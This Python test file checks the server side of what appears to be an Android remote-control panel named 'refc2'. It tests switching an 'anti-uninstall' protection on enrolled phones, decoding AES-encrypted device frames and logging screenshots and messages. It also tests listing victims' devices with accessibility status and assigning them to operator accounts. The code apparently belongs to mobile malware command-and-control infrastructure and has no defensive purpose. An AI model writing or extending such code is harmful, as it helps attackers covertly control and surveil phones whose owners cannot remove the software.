import base64
import asyncio
import json
import unittest
from unittest import mock

from server import api_impl, refc2


class DeviceOnlineProjectionTests(unittest.TestCase):
    def setUp(self):
        self.old_devices = refc2.STATE['devices']
        self.old_users = api_impl.S.get('users')

    def tearDown(self):
        refc2.STATE['devices'] = self.old_devices
        api_impl.S['users'] = self.old_users

    def test_uninstall_protection_state_projects_to_device_row(self):
        rec = {
            'id': 'dev-policy', 'online': True, 'last_seen': 123,
            'first_seen': 100, 'caps': {},
        }
        state = refc2._remember_anti_uninstall(rec, True, 'confirmed', 123)
        refc2.STATE['devices'] = {'dev-policy': rec}

        info = refc2.device_rows()[0]['extra']['deviceInfo']
        self.assertTrue(info['antiUninstall'])
        self.assertEqual(info['antiUninstallStatus'], 'confirmed')
        self.assertEqual(info['antiUninstallUpdatedAt'], 123)
        self.assertEqual(state, {
            'enabled': True, 'status': 'confirmed', 'updatedAt': 123,
        })

    def test_pending_command_does_not_change_confirmed_selection(self):
        rec = {'caps': {}}
        refc2._remember_anti_uninstall(rec, True, 'confirmed', 123)
        state = refc2._remember_anti_uninstall(rec, True, 'pending', 124, False)
        info = rec['caps']['device_info']
        self.assertTrue(info['antiUninstall'])
        self.assertFalse(info['antiUninstallPending'])
        self.assertEqual(info['antiUninstallStatus'], 'pending')
        self.assertEqual(state['enabled'], True)
        self.assertEqual(state['pending'], False)

    def test_phone_success_receipt_confirms_button_state(self):
        rec = {
            'caps': {}, 'shots': [], 'msgs': [], 'frames': [],
            'last_seen': 0, 'first_seen': 0, 'ws': object(),
        }
        refc2.STATE['devices'] = {'dev-receipt': rec}
        payload = {
            'action': 'action_result',
            'data': {
                'action': 'antiDeleteOn', 'success': True,
                'effect': {'anti_uninstall': True},
            },
        }
        frame = '42' + json.dumps([
            'enc msg', refc2.aes_enc(json.dumps(payload, separators=(',', ':'))),
        ])
        with mock.patch.object(refc2, '_persist_anti_uninstall') as persist:
            asyncio.run(refc2.on_device_frame('dev-receipt', frame, object()))

        info = rec['caps']['device_info']
        self.assertTrue(info['antiUninstall'])
        self.assertEqual(info['antiUninstallStatus'], 'confirmed')
        persist.assert_called_once_with('dev-receipt', {
            'status': 'confirmed', 'updatedAt': info['antiUninstallUpdatedAt'],
            'enabled': True,
        })

    def test_native_21_device_online_populates_list_projection(self):
        rec = {
            'apkid': '10020', 'last_seen': 100, 'first_seen': 90,
            'ws': object(), 'caps': {}, 'shots': [], 'msgs': [],
        }
        refc2._merge_device_online(rec, {
            'deviceId': 'dev-1',
            'deviceInfo': {
                'brand': 'samsung', 'model': 'SM-G981V', 'version': 33,
                'area': 'CN', 'network': '5G', 'battery': 25,
                'charging': True, 'screen': 2400, 'lock': 0, 'acc': True,
                'appName': '测试', 'apkVer': '2.1', 'pkg': 'com.ref.test',
                'wallpaper': base64.b64encode(b'\xff\xd8\xffdemo').decode(),
            },
        })
        refc2.STATE['devices'] = {'dev-1': rec}
        row = refc2.device_rows()[0]
        self.assertEqual(row['appName'], '测试')
        self.assertEqual(row['brand'], 'samsung')
        self.assertEqual(row['model'], 'SM-G981V')
        self.assertEqual(row['androidVersion'], 33)
        self.assertEqual(row['network'], '5G')
        self.assertEqual(row['battery'], 25)
        self.assertTrue(row['accessibility'])
        self.assertEqual(row['extra']['deviceInfo']['apkVer'], '2.1')
        self.assertEqual(refc2._resolve_device_owner('', '10020', [
            {'username': 'admin', 'apkId': '10020'},
            {'username': 'mtx', 'apkId': '10020'},
        ]), 'mtx')

    def test_wallpaper_decoder_returns_real_image_mime(self):
        jpg = b'\xff\xd8\xfftest'
        raw, mime = refc2._wallpaper_bytes({
            'wallpaper_b64': 'data:image/jpeg;base64,' + base64.b64encode(jpg).decode()
        })
        self.assertEqual(raw, jpg)
        self.assertEqual(mime, 'image/jpeg')


if __name__ == '__main__':
    unittest.main()
